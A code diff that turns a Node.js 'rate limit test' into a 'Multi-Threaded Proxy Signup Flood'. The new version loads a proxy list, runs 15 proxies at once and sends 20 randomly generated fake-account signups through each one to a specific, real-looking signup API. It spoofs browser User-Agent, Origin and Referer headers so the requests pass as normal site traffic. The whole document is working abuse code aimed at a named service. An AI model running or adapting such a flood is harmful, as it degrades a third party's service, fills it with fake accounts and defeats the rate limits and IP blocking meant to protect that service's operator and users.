@@ -1,69 +1,100 @@
-const https = require('https');
+const fs = require('fs');
+const axios = require('axios');
+const HttpsProxyAgent = require('https-proxy-agent').HttpsProxyAgent;
 
-// ====================== CONFIG ======================
 const URL = 'https://api.aryankaushik.space/api/auth/signup';
-const ATTEMPTS = 100;      // ← Change this number
-const DELAY_MS = 400;      // ← Delay between requests (lower = more aggressive)
+const PROXY_FILE = 'proxy.txt';
+const REQUESTS_PER_PROXY = 20;   // exactly 20 per alive proxy
+const CONCURRENCY = 15;          // number of simultaneous proxies being tested
 
-// Random string generator
+let proxies = [];
+let proxyIndex = 0;
+
+// Load proxies
+try {
+    proxies = fs.readFileSync(PROXY_FILE, 'utf8')
+                .split('\n')
+                .map(p => p.trim())
+                .filter(p => p && !p.startsWith('#'));
+    console.log(`Loaded ${proxies.length} proxies from ${PROXY_FILE}`);
+} catch (e) {
+    console.error("❌ proxy.txt not found or empty!");
+    process.exit(1);
+}
+
+// Random data generator
 function randomString(length = 10) {
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+    return Math.random().toString(36).substring(2, length + 2);
+}
+
+// Get next proxy (round-robin)
+function getNextProxy() {
+    if (proxies.length === 0) return null;
+    const proxyStr = proxies[proxyIndex % proxies.length];
+    proxyIndex++;
+    return proxyStr;
+}
+
+// Test one proxy + fire 20 requests if alive
+async function processProxy() {
+    const proxyStr = getNextProxy();
+    if (!proxyStr) return;
+
+    const [host, port] = proxyStr.split(':');
+    const proxyConfig = {
+        host: host,
+        port: parseInt(port),
+        protocol: 'http'
+    };
+
+    const agent = new HttpsProxyAgent(proxyConfig);
+
+    console.log(`Testing proxy → ${proxyStr}`);
+
+    let successCount = 0;
+
+    for (let i = 1; i <= REQUESTS_PER_PROXY; i++) {
+        const rand = randomString(8);
+        const username = `stress_${rand}`;
+        const email = `${username}@duck.com`;
+        const password = `Pass${rand}123!`;
+
+        const payload = { username, email, password };
+
+        try {
+            const res = await axios.post(URL, payload, {
+                httpsAgent: agent,
+                timeout: 8000,
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Origin': 'https://aeroweb.aryankaushik.space',
+                    'Referer': 'https://aeroweb.aryankaushik.space/'
+                }
+            });
+
+            console.log(`[${proxyStr}] ${i}/${REQUESTS_PER_PROXY} | ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
+            successCount++;
+
+        } catch (err) {
+            const status = err.response ? err.response.status : 'CONN_ERR';
+            const body = err.response ? JSON.stringify(err.response.data) : err.message;
+            console.log(`[${proxyStr}] ${i}/${REQUESTS_PER_PROXY} | ${email} → ${status} | ${body}`);
+        }
+    }
+
+    console.log(`✅ Finished ${REQUESTS_PER_PROXY} requests on ${proxyStr} | Successful: ${successCount}`);
 }
 
 // ====================== MAIN ======================
-async function sendSignup(i) {
-    const rand = randomString(8);
-    const username = `stress_${rand}`;
-    const email = `${username}@duck.com`;
-    const password = `Pass${rand}123!`;
+console.log("=== Multi-Threaded Proxy Signup Flood Started ===\n");
 
-    const payload = JSON.stringify({
-        username: username,
-        email: email,
-        password: password
-    });
-
-    const options = {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Origin': 'https://aeroweb.aryankaushik.space',
-            'Referer': 'https://aeroweb.aryankaushik.space/'
-        }
-    };
-
-    const req = https.request(URL, options, (res) => {
-        console.log(`[${i}/${ATTEMPTS}] ${email} → HTTP ${res.statusCode}`);
-        
-        if (res.statusCode === 429) {
-            console.log("⚠️  RATE LIMIT HIT (429) !");
-        }
-    });
-
-    req.on('error', (err) => {
-        console.log(`[${i}/${ATTEMPTS}] ${email} → ERROR: ${err.message}`);
-    });
-
-    req.write(payload);
-    req.end();
+const workers = [];
+for (let i = 0; i < CONCURRENCY; i++) {
+    workers.push(processProxy());
 }
 
-// ====================== RUN ======================
-console.log(`=== Signup Rate Limit Test Started ===`);
-console.log(`Target: ${URL}`);
-console.log(`Attempts: ${ATTEMPTS} | Delay: ${DELAY_MS}ms`);
-console.log(`=====================================\n`);
-
-let count = 0;
-
-const interval = setInterval(() => {
-    if (count >= ATTEMPTS) {
-        clearInterval(interval);
-        console.log("\n=== Test Finished ===");
-        return;
-    }
-    count++;
-    sendSignup(count);
-}, DELAY_MS);
+// Run until all proxies are processed
+Promise.all(workers).then(() => {
+    console.log("\n🎯 All proxies processed. Script finished.");
+});
